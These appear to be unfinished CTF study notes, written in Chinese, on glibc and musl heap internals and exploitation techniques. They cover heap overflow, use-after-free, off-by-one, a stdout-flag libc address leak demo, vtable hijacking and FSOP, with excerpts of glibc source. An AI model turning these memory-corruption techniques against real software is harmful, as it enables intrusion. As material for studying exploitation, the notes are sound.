- 单个small bin链表中的chunk大小相同，32bit libc: 0x10, 0x18 ... 0x1f8; 64bit libc: 0x20, 0x30, ... 0x3f0
- 内存分配/释放速度：small bin比large bin快，比fast bin慢
- FIFO队列式管理，free时将新释放的chunk添加到链表头，malloc时从链表尾取
- 会进行合并操作



**malloc / free procedure:**

**malloc:**

1. (size合适时) 先到tcache, fastbin中找，然后到small bin找，最后到unsorted bin找。
2. 

**free:**

1. 属于tcache的，先放tcache，满了或不属于tache的 。。。 TBD

**Security Check:**





### Large Bins

大于等于1024B(0x400)的chunk称为large chunk，large bins用于管理large chunk

- index: [64\~126] 63个，分为6组，
- largechunk使用fd_nextsize、bk_nextsize连接



| Group | Count | Tolerance公差 |
| ----- | ----- | ------------- |
| 1     | 32    | 64B           |
| 2     | 16    | 512           |
| 3     | 8     | 4096          |
| 4     | 4     | 32768         |
| 5     | 2     | 2662144B      |
| 6     | 1     | infinite      |



### Heap Overflow

> 堆溢出

向某个chunk写入的字节数超过chunk本身可用的字节数(不是用户申请的字节数，chunk本身可用的字节数大于等于用户申请数)，导致数据溢出，覆盖高地址方向上物理相邻的下一个chunk

Trigger Conditions:

1. 向堆写入数据
2. 写入数据长度没有被良好控制



### Chunk Extend and Overlapping



### Use After Free

> Use After Free, UAF问题 

当一个内存块被释放之后再次被使用，有以下几种情况：

- chunk释放后，ptr 置 NULL：再次使用，程序崩溃。
- chunk释放后，ptr 没有置 NULL，下次使用前没有修改这块chunk：可能正常运行、编辑、输出、double free，UAF
- chunk释放后，ptr 没有置 NULL，下次使用前修改了这块chunk：可能会出现奇怪的问题

**Use After Free** 漏洞一般指free后未置NULL。一般称free后没置NULL的内存指针为**dangling pointer**。



### Off-By-One

修改一个chunk时，触发堆溢出，溢出1个字节，导致下一chunk的size域的最低字节可以被覆盖为任意数字(0-255)

Off-By-NULL的利用方式一般都可以用到Off-By-One问题中，因为Off-By-NULL相当于溢出的一个字节只能为0的特殊Off-By-One。

利用方式：

- 修改一个在unsorted bin中的chunk的size，将其改大，把改大的那部分malloc回来，用改大的一部分修改tcache里chunk的fw域



> case: 第四届强网拟态 `old_school`, vul: edit时，可能多写1B，导致修改下一chunk的size域最低1B为任意值。



### Off-By-NULL

修改一个chunk时，触发堆溢出，溢出1个字节，导致下一chunk的size域的最低字节可以被覆盖为0

利用方式：

- 向前合并虚假chunk：改变一个chunk的`prev_inuse`位，改`prev_size`，将前一个chunk中的一个fake chunk合并入unsorted bin中，再malloc回来



> case: 第四届强网拟态 `old_school_revenge`，vul: edit时，可能多写1B，导致下一chunk的size域最低1B被改为0。



### House Of Einherjar

> https://hollk.blog.csdn.net/article/details/117112930?spm=1001.2014.3001.5502









## Heap: musl-libc

> http://git.etalabs.net/cgit/musl/ musl官网
>
> https://juejin.cn/post/6844903574154002445 从一次 CTF 出题谈 musl libc 堆漏洞利用
>
> https://xz.aliyun.com/t/10326 musl 1.2.2 总结+源码分析 One
>
> musl libc约等于dlmalloc(glibc堆管理器ptmalloc2前身)，故chunk unbin等与glibc十分相似

musl libc: 专为嵌入式系统开发的轻量级libc库，简单、轻量、高效

- chunk 0x20 对齐

bin由64个结构类似small bin的双向循环链表组成，使用bitmap记录每个链表是否为空，从链表首部取出chunk，尾部插入chunk。每个bin容纳的chunk大小不同，至多容纳1024种不同大小的chunk

```cpp
struct chunk { // 0x20 对齐 // 32bit对齐
    size_t psize, csize; // 相当于 glibc 的 prev size 和 size // 最后1bit是inuse位
    struct chunk *next, *prev;
};
```

- chunk 之间**不重用**`psize`字段
- `psize`和`csize`字段都有标志位（glibc 只有`size`字段有），但只有一种位于最低位的标志位`INUSE`（glibc 最低三位都有标志位）
- 若`INUSE`=1（最低位为1），表示 chunk 正在被使用；若`INUSE`=0（最低位为0），表示 chunk 已经被释放或者通过`mmap`分配的，需要通过`psize`的标志位来进一步判断 chunk 的状态

```cpp
static struct { // mal结构体类似于 glibc 中的arena // 记录堆的状态
    volatile uint64_t binmap; // 记录每个bin是否为空 某个bit=1表示对应bin非空，即链中有chunk
    struct bin bins[64]; // 链表头数组
    volatile int free_lock[2]; // 锁
} mal; 

struct bin { // 用循环链表来记录
    volatile int lock[2];
    struct chunk *head; // point to head chunk
    struct chunk *tail; // point to tail chunk
};
```

| bin index | chunk size count | chunk size range  | 下标 i 与 chunk 大小范围的关系                        |
| --------- | ---------------- | ----------------- | ----------------------------------------------------- |
| 0-31      | 1                | 0x20 – 0x400      | (i+1) * 0x20                                          |
| 32-35     | 8                | 0x420 – 0x800     | (0x420+(i-32) \*0x100) ~ (0x500+(i-32)\* 0x100)       |
| 36-39     | 16               | 0x820 – 0x1000    | (0x820+(i-36) \*0x200) ~ (0x1000+(i-36)\* 0x200)      |
| 40-43     | 32               | 0x1020 – 0x2000   | (0x1020+(i-40) \*0x400) ~ (0x1400+(i-40)\* 0x400)     |
| 44-47     | 64               | 0x2020 – 0x4000   | (0x2020+(i-44) \*0x800) ~ (0x2800+(i-44)\* 0x800)     |
| 48-51     | 128              | 0x4020 – 0x8000   | (0x4020+(i-48) \*0x1000) ~ (0x5000+(i-48)\* 0x1000)   |
| 52-55     | 256              | 0x8020 – 0x10000  | (0x8020+(i-52) \*0x2000) ~ (0xa000+(i-52)\* 0x2000)   |
| 56-59     | 512              | 0x10020 – 0x20000 | (0x10020+(i-56) \*0x4000) ~ (0x14000+(i-56)\* 0x4000) |
| 60-62     | 1024             | 0x20020 – 0x38000 | (0x20020+(i-60) \*0x8000) ~ (0x28000+(i-60)\* 0x8000) |
| 63        | unlimited        | 0x38000 above     | 0x38000 <                                             |

> 前32个bin类似fast bin, small bin，每个bin

### malloc and free





## **IO\_FILE** Utilization

> https://xz.aliyun.com/t/5579#toc-1 IO FILE 之vtable check 以及绕过 glibc 2.24引入vtable check
>
> https://xz.aliyun.com/t/5508
>
> https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie
>
> 综合case: 祥云杯 quietbaby 考察tcache, unsorted bin leak, stdout leak libc

`_IO_FILE_plus *_IO_list_all` (libc上可读可写段上) -> new `_IO_FILE_plus` -> `_IO_2_1_stderr_` ->`_IO_2_1_stdout_` -> `_IO_2_1_stdin_`。使用`_IO_FILE_plus`里的`_IO_FILE`的`struct _IO_FILE *_chain`来构成单链结构



### _IO_FILE Struct and stdin/out/err

[`libio/stdfiles.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/stdfiles.c#L52)文件里面定义了`_IO_2_1_stderr_, _IO_2_1_stdout_, _IO_2_1_stdin_`的文件号以及在链表上的先后关系，将`_IO_FILE_plus *_IO_list_all`指向`&_IO_2_1_stderr_`，`_IO_2_1_stderr_._chain->_IO_2_1_stdout_`，`_IO_2_1_stdout_._chain->_IO_2_1_stdin_`。

```c
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/stdfiles.c#L52
// 这个宏是libio/stdfiles.c开头定义的，猜测传参含义：_IO_FILE_plus指针，文件号，链表下一元素，属性
DEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES); // 将_IO_2_1_stdin_文件号定为0，下一FILE结构体指针为0
DEF_STDFILE(_IO_2_1_stdout_, 1, &_IO_2_1_stdin_, _IO_NO_READS);
DEF_STDFILE(_IO_2_1_stderr_, 2, &_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);

struct _IO_FILE_plus *_IO_list_all = &_IO_2_1_stderr_; // 定义在libc可读写段上
```

- `_IO_list_all`是表示FILE结构体链表头部的全局变量，进程内FILE结构通过`struct _IO_FILE._chain` 彼此链接成链表

```c
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/libio.h#L149
extern struct _IO_FILE_plus _IO_2_1_stdin_; // 0 _IO_FILE_plus: _IO_FILE file; IO_jump_t *vtable;
extern struct _IO_FILE_plus _IO_2_1_stdout_; // 1
extern struct _IO_FILE_plus _IO_2_1_stderr_; // 2
// _IO_list_all -> _IO_2_1_stderr_ -> _IO_2_1_stdout_ -> _IO_2_1_stdin_
```

- libc.so 上有`stdin, stdout, stderr`符号，是存储`_IO_2_1_stdin_, _IO_2_1_stdout_, _IO_2_1_stderr_`的指针。前述六个符号都位于libc.so的数据段，可读写
- 用户程序使用`fopen`创建的文件流是分配在堆内存上

```c
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/libioP.h#L324
struct _IO_FILE_plus { // _IO_FILE_plus 包裹 _IO_FILE
    _IO_FILE    file; // _IO_FILE结构
    IO_jump_t   *vtable; // IO_jump_t型指针(在后面劫持vtable节讲) // vtable指向一系列函数指针
}
```

- libc 2.31.9000的`_IO_FILE, _IO_FILE_complete`定义，与2.35的相同

```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/bits/types/struct_FILE.h#L49
struct _IO_FILE { 
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain; // 进程中的FILE结构通过_chain域连接成一个链表

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE   // 如果使用旧的_IO_FILE，到此处停止，后续属于另一结构体，否则后面的还是属于_IO_FILE内的
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file; // 定义的_IO_FILE_complete也会包含前面定义的_IO_FILE
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

#### `_IO_FILE_plus` and vtable

```c
struct _IO_FILE_plus {
    _IO_FILE    file; // 注意这个是struct 不是指针，_IO_FILE在上一节讲过了
    IO_jump_t   *vtable; // *vtable的偏移是与32/64bit有关的
}
// We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table.
```

> libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8

```c
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/libioP.h#L293
struct _IO_jump_t { // _IO_FILE_plus 里 vtable指针的类型
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow); // need by: fwrite
    JUMP_FIELD(_IO_underflow_t, __underflow); // called by: _IO_flush_all_lockp 
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn); // called by: fwrite, puts
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn); // called by: fread
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate); // need by: fread
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
}; // 共21个
#define JUMP_FIELD(TYPE, NAME) TYPE NAME
```

c/c++中调用的函数会经过多个宏定义/struct之后，才能找到实际实现逻辑的地方，其中涉及的宏定义以及查找过程参照IO\_FILE: fread。[bootlin](elixir.bootlin.com)不知道是不是搜索逻辑有问题，有的函数定义查找不到，需要借助[woboq](code.woboq.org)查找

- `fwrite`: [`/libio/iofwrite.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/iofwrite.c#L30) ` _IO_fwrite` -> `_IO_sputn` -> `_IO_XSPUTN` -> `__xsputn(vtable)` -> `_IO_file_xsputn` -> [/libio/fileops.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L1197)`_IO_new_file_xsputn` (need)-> `_IO_OVERFLOW` -> `__overflow(vtable)` -> [`/libio/fileops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L731) `_IO_new_file_overflow` 

> 这里的调用过程涉及到大量的宏定义，但凡对宏定义有些不熟悉，都看不懂，但可以根据注释大胆猜测





#### IO\_FILE: fopen

> https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis   IO FILE之fopen详解

fopen需要注意的点：

- fopen会调用malloc给新创建的`_IO_FILE_plus`，故会在堆上
- 使用`_IO_file_jumps`初始化vtable，故默认的vtable的函数与`_IO_file_jumps`有关
- 将新创建的`_IO_FILE_plus`链上`_IO_list_all`，使得`_IO_list_all`指向新创建的`_IO_FILE_plus`



- call process: `fopen` -> [/libio/iofopen.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/iofopen.c#L84)`_IO_new_fopen` ->  [/libio/iofopen.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/iofopen.c#L56) `__fopen_internal`

`__fopen_internal` main process:

1. `malloc`: 分配内存空间`*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));`
2. `_IO_no_init`: (`/libio/genops.c`) 对file结构体进行`null`初始化 : 最主要的功能是初始化`locked_FILE`里面的`_IO_FILE_plus`结构体，基本所有都初置null / 默认值，同时将`_wide_data`字段赋值并初始化
3. `_IO_file_init`: (`/libio/fileops.c`) 将结构体链接进`_IO_list_all`链表头。
4. `_IO_file_fopen`: (`libio/fileops.c`) 执行系统调用打开文件

```cpp
#include <stdio.h>  // fopen 测试代码
int main() {
    FILE* fp = fopen("test", "wb");
    char* ptr = malloc(0x20);
}
```

```cpp
_IO_FILE* __fopen_internal(const char* filename, const char* mode, int is32) {  // fopen 的逻辑实际上在这里实现
    struct locked_FILE {          // 定义一个结构体 locked_FILE // 64bit OS中为0x230 B
        struct _IO_FILE_plus fp;  // 使用的 IO_FILE 的结构体
#ifdef _IO_MTSAFE_IO
        _IO_lock_t lock;
#endif
        struct _IO_wide_data wd;
    }* new_f = (struct locked_FILE*)malloc(sizeof(struct locked_FILE));  // step-1: 分配内存
#ifdef _IO_MTSAFE_IO
    new_f->fp.file._lock = &new_f->lock;
#endif
    _IO_no_init(&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);// step-2: null初始化结构体数据
    _IO_JUMPS(&new_f->fp) = &_IO_file_jumps;  // 设置 vtable 为 _IO_file_jumps
    _IO_new_file_init_internal (&new_f->fp);  // step-3: 将file结构体链接进去_IO_list_all
    if (_IO_file_fopen((_IO_FILE*)new_f, filename, mode, is32) != NULL)  // step-4: 打开文件
        return __fopen_maybe_mmap(&new_f->fp.file); // 
   	_IO_un_link (&new_f->fp); // 如果走到这，表示文件open失败了
    free (new_f);
    return NULL;
}
```

Step-3 `_IO_new_file_init_internal`([/libio/fileops.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L106)) 把`_IO_FILE_plus fp`链接进`_IO_list_all`链表时：

主要逻辑在`_IO_link_in`。主要检查`_IO_FILE_plus->file._flags`的`_IO_LINKED`是否置位，为0表示这个结构体没有进入`_IO_list_all`，则后续链接进`_IO_list_all`，`_IO_list_all`指向刚链入的`_IO_FILE_plus *fp`，即新链入的在链表头

```cpp
void _IO_new_file_init_internal (struct _IO_FILE_plus *fp) {
  fp->file._offset = _IO_pos_BAD;
  fp->file._flags |= CLOSED_FILEBUF_FLAGS;
  _IO_link_in (fp); // main logic
  fp->file._fileno = -1;
}
void _IO_link_in (struct _IO_FILE_plus *fp) {
  if ((fp->file._flags & _IO_LINKED) == 0) { // 检查flag的标志位是否是_IO_LINKED
      fp->file._flags |= _IO_LINKED;    // set _IO_LINKED 表示已link
// ... _IO_MTSAFE_IO related
      fp->file._chain = (FILE *) _IO_list_all; // 插入链表头
      _IO_list_all = fp; // 更新链表头 _IO_list_all为新链入的_IO_FILE_plus
// ... _IO_MTSAFE_IO related
    }
}
libc_hidden_def (_IO_link_in)
```

Step-4 `_IO_file_fopen` 打开文件句柄时：

1. 进入`_IO_new_file_fopen`([`libio/fileops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L212))函数中，检查文件是否已打开，未打开则继续
2. 设置文件打开模式
3. 调用`_IO_file_open`函数([`/libio/fileops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L281))：
   1. 执行系统调用`open`打开文件
   2. 将文件描述符赋值给FILE结构体的`_fileno `字段
   3. 再次调用 `_IO_link_in` 确保结构体链进 `_IO_list_all`



#### IO\_FILE: fread

`fread`从文件流中读数据，读取长度为`size * count`，输出到`FILE *stream`中。

```c
size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; // fread原型
```

[`/libio/stdio.h`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/stdio.h#L646)里声明`fread`的原型

```cpp
// Read chunks of generic data from STREAM. 
// This function is a possible cancellation point and therefore not marked with __THROW.
extern size_t fread (void *__restrict __ptr, size_t __size,
		     size_t __n, FILE *__restrict __stream) __wur;
// __ptr: 存放待读取数据的缓冲区 // __size: 指定block长度 // __n: block数量 // __stream: 目标文件流
```

libc 2.31 9000 [`/libio/bits/stdio2.h`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/bits/stdio2.h#L284)定义了`fread`函数，

```c
// https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/misc/sys/cdefs.h#L124 定义 __bos0
#define __bos0(ptr) __builtin_object_size (ptr, 0) // 以type=0调用GNU GCC built in function
// stdio2.h 中的 fread 的函数定义
__fortify_function __wur size_t
fread (void *__restrict __ptr, size_t __size, size_t __n, FILE *__restrict __stream) {
  if (__bos0 (__ptr) != (size_t) -1) // 编译时无法确定ptr指向的对象
    {
      if (!__builtin_constant_p (__size) || !__builtin_constant_p (__n) // GCC built in function
	  || (__size | __n) >= (((size_t) 1) << (8 * sizeof (size_t) / 2)))
	return __fread_chk (__ptr, __bos0 (__ptr), __size, __n, __stream); // 一般会命中这一行？

      if (__size * __n > __bos0 (__ptr)) // 命中此处会报错
	return __fread_chk_warn (__ptr, __bos0 (__ptr), __size, __n, __stream);
    }
  return __fread_alias (__ptr, __size, __n, __stream); // 不是很懂这个函数是在哪里的
}
```

> Built-in Function: *int* **__builtin_constant_p** *(exp)*   [GCC built in function](https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html)
>
> 确定一个值在编译阶段是否已知为常量，因此GCC可以对涉及该值的表达式执行常量折叠
>
> You can use the built-in function `__builtin_constant_p` to determine if a value is known to be constant at compile time and hence that GCC can perform constant-folding on expressions involving that value.
>
> return 1: 编译时常量.  return 0: 不确定是否为编译时常量，可能是也可能不是
>
> *size_t* **__builtin_object_size** *(const void \* ptr, int type)    [GCC built in function](https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html)
>
> 如果编译时已知ptr指向的对象，返回ptr到ptr指向对象的末尾的字节数；编译时无法确定ptr指向的对象，返回`(size_t) -1`for type 0 or 1; `(size_t) 0` ` for type 2 or 3

glibc-2.31.9000 [/debug/fread_chk.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/debug/fread_chk.c#L31) 中定义的 `__fread_chk`: 

```cpp
# define __glibc_unlikely(cond)	__builtin_expect ((cond), 0) // define in other file
size_t
__fread_chk (void *__restrict ptr, size_t ptrlen, size_t size, size_t n, FILE *__restrict stream) {
  size_t bytes_requested = size * n;
  // 两个if都是检查 size * n 是否会导致整数上溢
  if (__builtin_expect ((n | size) >= (((size_t) 1) << (8 * sizeof (size_t) / 2)), 0)) {
      if (size != 0 && bytes_requested / size != n)  __chk_fail ();// 发生整数上溢
    }

  if (__glibc_unlikely (bytes_requested > ptrlen)) // 如果请求的字节长度大于ptrlen，invalid
    __chk_fail ();

  CHECK_FILE (stream, 0); // stream: 目标文件流
  if (bytes_requested == 0)
    return 0;

  size_t bytes_read;
  _IO_acquire_lock (stream);
  bytes_read = _IO_sgetn (stream, (char *) ptr, bytes_requested); // 主要逻辑在这
  _IO_release_lock (stream);
  return bytes_requested == bytes_read ? n : bytes_read / size;
}
```

glibc-2.31.9000 [/libio/genops.c](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/genops.c#L408) 中定义了`_IO_sgetn`，该函数调用`_IO_XSGETN`

```c
size_t _IO_sgetn (FILE *fp, void *data, size_t n) { // fp是输出文件流，data是输入文件流
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
libc_hidden_def (_IO_sgetn) // 在动态连接的过程中进行延迟绑定，只有在该函数调用到的时候才进行地址绑定
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N) // /libio/libioP.h 中的宏定义
#define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N) // __xsgetn 是vtable中的JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
```

`__xsgetn`默认指向[`/libio/fileops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L1272)的`_IO_file_xsgetn`，这个“默认指向”可能和`/libio/fileops.c`里的[`const struct `](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L1433) `_IO_file_jumps`有关，这个`_IO_file_jumps`在fopen里用到，用于初始化新打开的`IO_FILE`对象的vtable

```c
size_t _IO_file_xsgetn (FILE *fp, void *data, size_t n){ // 节选部分源码
    char *s = data;
    want = n;
    while (want > 0){
        have = fp->_IO_read_end - fp->_IO_read_ptr; // 输出文件的 _IO_read_end - _IO_read_ptr 就是已经读取出来的字节长度
        if (want <= have) { // 如果需要读取的字节长度 want 小于等于可以读取的最大长度 have （即剩余空间大小），一次性读取完
            memcpy (s, fp->_IO_read_ptr, want); // 从 s/data 读取 want 个字节长到 fp->_IO_read_ptr 中
            fp->_IO_read_ptr += want; // read ptr 后移
            want = 0; // 一次性读取完了，清空需要读取的长度want
        }else{
            ....
        }
        .......
    }
    return n - want;
}
```







#### `_IO_2_1_stdout_` leak libc

> http://blog.eonew.cn/archives/1190 利用 `_IO_2_1_stdout_` 泄露信息

- `_flags`高2B由libc固定，低2B为flags

 [glibc-2.31 libio/fileops.c `_IO_new_file_xsputn`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/fileops.c#L1197)

```cpp
gef➤  p stdout
$4 = (FILE *) 0x7f4fd05e46c0 <_IO_2_1_stdout_>
gef➤  p _IO_2_1_stdout_
$5 = {
  file = {
    _flags = 0xfbad2887, // 高2B由libc固定, 低2B:flags // High-order word is _IO_MAGIC; rest is flags
    _IO_read_ptr = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7f4fd05e4743 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7f4fd05e4744 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7f4fd05e39a0 <_IO_2_1_stdin_>,
    _fileno = 0x1, // stdin=0, stdout=1, stderr=2
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "\n",
    _lock = 0x7f4fd05e6690 <_IO_stdfile_1_lock>,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7f4fd05e38a0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f4fd05e54c0 <_IO_file_jumps>
}
```

- `stdout->_flags`含义：`/usr/include/x86_64-linux-gnu/bits/libio.h`

```cpp
#define _IO_MAGIC 0xFBAD0000 /* Magic number */  // /usr/include/x86_64-linux-gnu/bits/libio.h
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000 // High-order word(2B) is _IO_MAGIC; rest is flags 
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 // Set if linked (using _chain) to streambuf::_list_all. // default
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_IS_FILEBUF 0x2000 // _IO_2_1_stdout_ default
#define _IO_BAD_SEEN 0x4000
#define _IO_USER_LOCK 0x8000
```

> ```cpp
> // _IO_2_1_stdout_ 一般为 0xfbad2087
> _IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF
> ```

```cpp
#include <stdio.h> // gcc stdout_overlapping.cpp -o a
int main() {
    setbuf(stdout, NULL);
    printf("flags: 0x%x\n", stdout->_flags);
    stdout->_flags = 0xfbad2087 | 0x1000 | 0x800;
    printf("modified_flag: 0x%x\n", stdout->_flags);
    stdout->_IO_write_base -= 8;
    printf("modified_flag: 0x%x\n", stdout->_flags);
}// Output:
flags: 0xfbad2087    // _IO_2_1_stdout_ 默认的 _flags
modified_flag: 0xfbad3887  // 经过修改之后的
�����modified_flag: 0xfbad3887  // stdout->_IO_write_base -= 8 后 泄露出libc addr
```





### Hijack vtable

> 伪造vtable劫持程序流程，vtable理论相关见前面vtable一节

libc 2.23及之前的libc上可实施，libc2.24之后加入了vtable check机制，无法再构造vtable



### FSOP

> File Stream Oriented Programming
>
> https://xz.aliyun.com/t/5508  IO FILE 之劫持vtable及FSOP

- ·劫持libc可读写段上的`_IO_list_all`，使得链表头指向伪造的`_IO_FILE_plus`，然后触发`_IO_flush_all_lockp`刷新链表中所有项的文件流，相当于对每个FILE调用fflush，对应`_IO_FILE_plus.vtable` 中的 `_IO_overflow`

[`/libio/genops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/genops.c#L724) 的`_IO_flush_all`调用[`/libio/genops.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/libio/genops.c#L685)`_IO_flush_all_lockp (1)`

`_IO_flush_all_lockp` 不需要手动调用，在一些情况下这个函数会被系统调用：

1. 当 libc 执行 abort 流程时
2. 当执行 exit 函数时
3. 当执行流从 main 函数返回时

- 攻击时需要泄露libc地址，才能得到`_IO_flush_all`的地址。然后改`_IO_flush_all`为指向

```c
int _IO_flush_all_lockp (int do_lock) {
  int result = 0;
  FILE *fp;
// _IO_MTSAFE_IO related ...
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain) {
      run_fp = fp;
      if (do_lock) _IO_flockfile (fp);

      if (( (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) )
	          && _IO_OVERFLOW (fp, EOF) == EOF) // 这里会调用 vtable 里面的 __overflow
	     result = EOF;

      if (do_lock)  _IO_funlockfile (fp);
      run_fp = NULL;
    }
// _IO_MTSAFE_IO related ...
  return result;
}
```

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/when_glibc_detect_the_memory_corruption.jpeg)





## exit hook

> http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html 会解释`__run_exit_handlers，__call_tls_dtors`的主要逻辑
>
> https://hackmd.io/@u1f383/pwn-cheatsheet#exit-hook 
>
